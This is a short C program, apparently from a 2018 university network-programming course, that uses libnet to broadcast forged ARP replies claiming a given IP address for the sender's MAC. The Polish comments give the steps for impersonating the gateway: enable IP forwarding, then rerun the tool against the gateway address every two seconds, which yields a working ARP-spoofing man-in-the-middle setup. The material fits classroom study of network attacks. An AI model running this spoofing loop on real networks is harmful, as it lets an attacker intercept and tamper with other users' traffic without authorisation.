/*
 * Copyright (C) 2018 Michal Kalewski <mkalewski at cs.put.poznan.pl>
 *
 * Compilation:  gcc -Wall ./arprep.c -o ./arprep -lnet
 * Usage:        ./arprep HOST  // adres ip kub nazwa domenowa
 * NOTE:         This program requires root privileges.
 *
 * Bug reports:  https://gitlab.cs.put.poznan.pl/mkalewski/ps-2018/issues
 *
 */

// podszycie się pod brame
// 1) echo 1 > /proc/sys/net/ipv4/ip_forward    // jako router
// 2) while true; do sudo ./arprep 150.254.32.129; sleep 2; done

// ustawianie adresu bramy recznie (nie bedzie nadpisywana), dziala tylko do restartu

// sudo arping -I br0 150.254.32.133


#include <libnet.h>
#include <stdlib.h>

int main(int argc, char** argv) {
  libnet_t *ln;
  u_int32_t target_ip_addr, zero_ip_addr;
  u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  struct libnet_ether_addr* src_hw_addr;
  char errbuf[LIBNET_ERRBUF_SIZE];

  ln = libnet_init(LIBNET_LINK, NULL, errbuf);
  src_hw_addr = libnet_get_hwaddr(ln);
  target_ip_addr = libnet_name2addr4(ln, argv[1], LIBNET_RESOLVE);
  zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  // nagłowek arp z odpowiedzia
  // spreparowana odp: 
  // sender:
  // ip: argv[1]
  // mac: mac(br0)
    // target 
  // ip: 0.0.0.0
  // mac: 00:00:00:00:00:00
  libnet_autobuild_arp(
    ARPOP_REPLY,                     /* operation type       */
    src_hw_addr->ether_addr_octet,   /* sender hardware addr */
    (u_int8_t*) &target_ip_addr,     /* sender protocol addr */
    zero_hw_addr,                    /* target hardware addr */
    (u_int8_t*) &zero_ip_addr,       /* target protocol addr */
    ln);                             /* libnet context       */
  libnet_autobuild_ethernet(
    bcast_hw_addr,                   /* ethernet destination */
    ETHERTYPE_ARP,                   /* ethertype            */
    ln);                             /* libnet context       */
  libnet_write(ln);
  libnet_destroy(ln);
  return EXIT_SUCCESS;
}
